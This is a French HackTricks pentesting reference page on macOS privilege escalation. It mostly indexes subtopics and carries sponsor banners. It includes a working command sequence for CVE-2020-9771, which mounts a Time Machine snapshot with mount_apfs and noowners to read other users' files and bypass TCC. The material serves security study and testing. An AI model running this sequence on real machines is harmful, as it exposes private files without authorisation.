# Sécurité et élévation des privilèges sur macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof ne sont lancées que lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du pirate web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Base de MacOS

Si vous n'êtes pas familier avec macOS, vous devriez commencer par apprendre les bases de macOS :

* Fichiers et permissions spéciaux de macOS :

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* Utilisateurs courants de macOS

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* AppleFS

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* L'architecture du noyau

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* Services et protocoles réseau courants de macOS

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

* macOS en open source : [https://opensource.apple.com/](https://opensource.apple.com/)

### MacOS MDM

Dans les entreprises, les systèmes macOS sont très probablement gérés avec un MDM. Par conséquent, du point de vue d'un attaquant, il est intéressant de savoir comment cela fonctionne :

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - Inspection, débogage et fuzzing

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## Protections de sécurité de MacOS

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## Surface d'attaque

### Permissions de fichier

Si un **processus s'exécutant en tant que root écrit** un fichier qui peut être contrôlé par un utilisateur, l'utilisateur pourrait en abuser pour **escalader les privilèges**.\
Cela peut se produire dans les situations suivantes :

* Le fichier utilisé a déjà été créé par un utilisateur (appartenant à l'utilisateur)
* Le fichier utilisé est accessible en écriture par l'utilisateur en raison d'un groupe
* Le fichier utilisé se trouve dans un répertoire appartenant à l'utilisateur (l'utilisateur peut créer le fichier)
* Le fichier utilisé se trouve dans un répertoire appartenant à root, mais l'utilisateur a un accès en écriture dessus en raison d'un groupe (l'utilisateur peut créer le fichier)

Pouvoir **créer un fichier** qui va être **utilisé par root**, permet à un utilisateur de **profiter de son contenu** ou même de créer des **liens symboliques/hardlinks** pour le pointer vers un autre endroit.

Pour ce type de vulnérabilités, n'oubliez pas de **vérifier les installateurs `.pkg`** vulnérables :

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### Abus des privilèges et des autorisations via l'abus de processus

Si un processus peut **injecter du code dans un autre processus avec des privilèges ou des autorisations supérieures** ou le contacter pour effectuer des actions avec des privilèges, il peut escalader les privilèges et contourner les mesures de défense telles que [Sandbox](macos-security-protections/macos-sandbox/) ou [TCC](macos-security-protections/macos-tcc/).

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}
### Gestionnaires d'applications pour les extensions de fichiers et les schémas d'URL

Des applications étranges enregistrées par des extensions de fichiers peuvent être utilisées de manière abusive et différentes applications peuvent être enregistrées pour ouvrir des protocoles spécifiques.

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

## Élévation de privilèges sur MacOS

### CVE-2020-9771 - Contournement de TCC et élévation de privilèges avec mount\_apfs

**N'importe quel utilisateur** (même non privilégié) peut créer et monter une sauvegarde de machine à remonter dans le temps et **accéder à TOUS les fichiers** de cette sauvegarde.\
Le seul privilège nécessaire est que l'application utilisée (comme `Terminal`) ait **un accès complet au disque** (FDA - Full Disk Access) (`kTCCServiceSystemPolicyAllfiles`), qui doit être accordé par un administrateur.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Une explication plus détaillée peut être [**trouvée dans le rapport original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### Informations sensibles

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

Tout d'abord, veuillez noter que **la plupart des astuces sur l'élévation de privilèges affectant Linux/Unix affecteront également les machines MacOS**. Donc voir:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## Applications de défense MacOS

## Références

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez une récompense sans délai**\
Les primes HackenProof sont lancées uniquement lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du hacker web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
